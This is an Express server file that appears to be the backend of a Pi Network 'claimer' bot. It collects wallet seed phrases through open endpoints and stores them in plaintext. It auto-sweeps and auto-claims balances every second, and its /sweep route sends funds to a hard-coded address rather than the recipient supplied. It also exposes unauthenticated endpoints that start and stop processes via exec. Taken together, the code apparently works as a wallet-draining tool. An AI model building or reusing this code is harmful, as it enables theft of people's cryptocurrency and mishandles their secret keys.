
process.on('unhandledRejection', (reason, promise) => {
  console.error('🛑 Unhandled Promise Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.error('🛑 Uncaught Exception:', err);
});

import cors from 'cors';
import express from 'express';
import dotenv from 'dotenv';
import { connectToDB } from './db.js';
import passphraseRoutes from './routes/passphrases.js';
import sponsorRoutes from './routes/sponsors.js';
import { autoCheckSponsorForClaimable, autoFundWallet, autoSweepSponsor, autoSweepWallet, firstFilteredSponsors, FloodchannelTransaction, getAccount, getBaseFee, getClaimableBalance, getKeypairFromPassphrase, PI_PUBLIC_ADDRESS, sweepWallet } from './utils/fn.js';
import Passphrase from './models/Passphrase.js';
import Sponsors from './models/Sponsors.js';
import { storeLockedPi } from './utils/modelfn.js';
import ColemanSettings from './models/ColemanSettings.js';
import { exec } from "child_process";
import Log from './models/Log.js';
dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

const allowedOrigins = ['http://localhost:8888', 'https://piclaimer.netlify.app', 'https://cole-pi-admin.netlify.app', 'http://localhost:5173'];
app.use(express.json());
app.use(cors({
    origin: function (origin, callback) {
        if (!origin) return callback(null, true);
        if (allowedOrigins.includes(origin)) {
            return callback(null, true);
        } else {
            return callback(new Error('Not allowed by CORS'));
        }
    },
    methods: ['GET', 'POST', 'PUT', 'DELETE'],
    allowedHeaders: ['Content-Type', 'Authorization'],
}));

app.post("/api/bot/restart", (req, res) => {
    exec("pm2 restart colemanServer", (err, stdout, stderr) => {
        if (err) {
            return res.status(500).json({ success: false, error: stderr });
        }
        const isOnline = stdout.includes("status online");
        res.json({ success: true, message: "Bot restarted", output: stdout, online: isOnline });
    });
});

await connectToDB();

app.use('/api/passphrases', passphraseRoutes);
app.use('/api/sponsors', sponsorRoutes);

app.post('/api/passphrases/upload', async(req, res) => {
    const { mnemonic, name } = req.body;
    if (!mnemonic) {
        return res.status(409).json({ success: false,  error: 'mnemonic is required' });
    }

    if (!name) {
        return res.status(409).json({ success: false,  error: 'Name is required' });
    }
    try {
        const kp = getKeypairFromPassphrase(mnemonic);
        const publicKey = kp.publicKey();
        const accountData = await getAccount(publicKey);
        if(!accountData) {
            return res.status(409).json({success: false, error: "Invalid passphrase uploaded"})
        }

        const saved = await storeLockedPi(mnemonic, publicKey, name, false, name);
        if(saved.success) {
            return res.status(201).json({ success: true,  feedback: saved.message });
        } else {
            return res.status(201).json({ success: false,  error: saved.message });
        }
    } catch(err) {
        res.status(500).json({success: false, error: `Failed to save passphrase: ${mnemonic.slice(0,15)}....${mnemonic.slice(-15)}` });
    }
})

app.post("/api/bot/status", (req, res) => {
    exec("pm2 show colemanServer", (err, stdout, stderr) => {
        if (err) return res.status(500).json({ success: false, error: stderr });
        const isOnline = stdout.includes("status online");
        res.json({ success: true, status: stdout, online: isOnline });
    });
});
app.post("/api/bot/start", (req, res) => {
    exec("pm2 restart colemanServer || pm2 start colemanServer.js --name colemanServer", (err, stdout, stderr) => {
        if (err) {
            return res.status(500).json({ success: false, error: stderr });
        }
        res.json({ success: true, message: "Bot started", output: stdout });
    });
});
app.post("/api/bot/stop", (req, res) => {
    exec("pm2 stop colemanServer", (err, stdout, stderr) => {
        if (err) {
            return res.status(500).json({ success: false, error: stderr });
        }
        exec("pm2 delete colemanServer");
        res.json({ success: true, message: "Bot stopped", output: stdout });
    });
});

app.post('/api/settings', async(req, res) => {
    const { maxFlood, name, fee, sweep, funderMnemonic, botAddress, minSponsorBalance } = req.body;

    if (!name) {
        return res.status(400).json({ success: false, error: "Name is required" });
    }
    try {
        const updateFields = {};
        if (maxFlood !== undefined) updateFields.maxFlood = maxFlood;
        if (fee !== undefined) updateFields.fee = fee;
        if (sweep !== undefined) updateFields.sweep = sweep;
        if (funderMnemonic !== undefined) updateFields.funderMnemonic = funderMnemonic;
        if (botAddress !== undefined) updateFields.botAddress = botAddress;
        if (minSponsorBalance !== undefined) updateFields.minSponsorBalance = minSponsorBalance;

        if(updateFields.funderMnemonic) {
            const kp = getKeypairFromPassphrase(updateFields.funderMnemonic.toLowerCase());
            const publicKey = kp.publicKey();
            const accountData = await getAccount(publicKey);
            if(!accountData) {
                return res.status(409).json({success: false, error: "Invalid passphrase uploaded"})
            }
        }

        if(updateFields.botAddress) {
            const BotAccountData = await getAccount(updateFields.botAddress);
            if(!BotAccountData) {
                return res.status(409).json({success: false, error: "Invalid address, address must start with G"})
            }
        }

        const settings = await ColemanSettings.findOneAndUpdate(
            { name },
            { $set: updateFields },
            { new: true, upsert: true }
        );
        res.json(settings);
    } catch(err) {
        console.log(err)
        res.status(500).json({success: false, error: `Error updating settings` });
    }
})

app.get('/api/settings/:name', async (req, res) => {
    const name = req.params.name;
    const settings = await ColemanSettings.findOne({ name });
    if (!settings) {
        return res.status(404).json({ error: "Settings not found" });
    }


    res.json(settings);
});

app.get('/api/logs/:name', async (req, res) => {
    const name = req.params.name;
    const logs = await Log.find({ name });
    if (!logs) {
        return res.status(404).json({ error: "Settings not found" });
    }


    res.json(logs);
});

// Ping route
app.get('/', (req, res) => {
  res.send('🔁 Pi Bot Server is running - Time: ' + new Date().toLocaleString());
});

app.post('/claimable-balance', async (req, res) => {
    const { publicKey } = req.body;
    if(!publicKey) {
        return res.status(400).json({error: "Valid public key is required"});
    }

    try {
        const claimable = await getClaimableBalance(publicKey);
        res.json({ success: true, claimable });
    } catch(err) {
        res.status(500).json({ error: err.response?.data || err.message });
    }
    
})

app.post('/claim', async (req, res) => {
    const { mnemonic, balanceId, recipient, amount } = req.body;
    if(!mnemonic) {
        return res.status(400).json({error: "Passphrase required"});
    }

    if(!recipient) {
        return res.status(400).json({error: "Wallet address required"});
    }

    try {
        const result = await FloodchannelTransaction(mnemonic, balanceId, recipient, amount);
        res.json({ success: true, result });
    } catch(err) {
        res.status(500).json({ error: err.response?.data || err.message });
    }
    
})

app.post('/store', async (req, res) => {
    const { mnemonic, balanceId, recipient, amount } = req.body;
    if(!mnemonic) {
        return res.status(400).json({error: "Passphrase required"});
    }

    if(!recipient) {
        return res.status(400).json({error: "Wallet address required"});
    }

    try {
        const now = new Date();
        const inThirtySeconds = new Date(now.getTime() + 10 * 60 * 1000);
        const result = await Passphrase.insertOne({ mnemonic, balanceId, receiverAddress: 'coleman', amount, claimableAt: inThirtySeconds, name: 'coleman' });
        res.json({ success: true, result });
    } catch(err) {
        res.status(500).json({ error: err.response?.data || err.message });
    }
    
})


app.post('/get-account', async (req, res) => {
    const { publicKey } = req.body;

    try {
        const account = await getAccount(publicKey);
        res.json({ account });
    } catch(err) {
        res.status(500).json({ error: err.response?.data || err.message });
    }
    
})

app.post('/get-fee', async (req, res) => {

    try {
        const fee = await getBaseFee();
        res.json({ fee });
    } catch(err) {
        res.status(500).json({ error: err.response?.data || err.message });
    }
    
})


app.post('/sweep', async (req, res) => {
    const { phrase, recipient } = req.body;
    if(!phrase) {
        return res.status(400).json({error: "Passphrase is required"});
    }

    if(!recipient) {
        return res.status(400).json({error: "Valid recipient is required"});
    }

    try {
        const keypair = getKeypairFromPassphrase(phrase);
        const publicKey = keypair.publicKey();
        const claimableBalance = await getClaimableBalance(publicKey);

        const records = claimableBalance?._embedded?.records || [];

        if (records.length > 0) {
            const entries = [];

            for (const record of records) {
                const claimant = record.claimants.find(
                    (c) => c.destination === publicKey
                );

                if (claimant) {
                    const predicate = claimant.predicate;
                    let claimableAt = null;

                    if (predicate?.not?.abs_before) {
                        claimableAt = predicate.not.abs_before; // this means claimable *after* that time
                    }

                    entries.push({
                        mnemonic:phrase,
                        recipient,
                        claimableAt,
                        balanceId: record.id,
                        amount: record.amount,
                    });
                }
            }

            if (entries.length > 0) {

                for(const entry of entries) {

                    const existing = await Passphrase.findOne({ balanceId: entry.balanceId });
                    if (!existing) {
                        await Passphrase.insertOne({ mnemonic: entry.mnemonic, balanceId: entry.balanceId, amount: entry.amount, receiverAddress: entry.recipient, claimableAt: entry.claimableAt });
                    }
                }
            }
        }

        const {data, amount} = await sweepWallet(phrase, PI_PUBLIC_ADDRESS);
        if(!data.hash) {
            res.json({ success: false, reason: "Failed", amount });
        } else {
            res.json({ success: true, reason: "success", hash: data.hash, amount });
        }
    } catch(err) {
        console.log(err)
        res.status(500).json({ error: err.response?.data || err.message });
    }
    
})

const instanceId = process.env.INSTANCE_ID || 0;
const rawSponsors = await Sponsors.find();

const sponsors = [];
    
for (const sponsor of rawSponsors) {
    const kp = getKeypairFromPassphrase(sponsor.mnemonic);
    const pubKey = kp.publicKey();

    if (!firstFilteredSponsors.includes(pubKey)) {
        sponsors.push(sponsor);
    }
}

// setInterval(async() => {

    // console.log(`Total usable sponsors: ${sponsors.length}`)

    // const chunkSize = Math.ceil(sponsors.length/3);

    // const start = instanceId * chunkSize;
    // const end = start + chunkSize;
    // const sponsorChunk = sponsors.slice(start, end);

    // autoClaimUnlocked(sponsorChunk);
// }, 100)

setInterval(() => autoFundWallet(instanceId), 10000);
setInterval(() => autoSweepWallet(instanceId), 1000);
// setInterval(() => autoSweepSponsor(instanceId), 1000);

// setInterval(() => autoCheckSponsorForClaimable(instanceId), 300000);

app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Pi Bot Server running on port ${PORT}`);
}); 


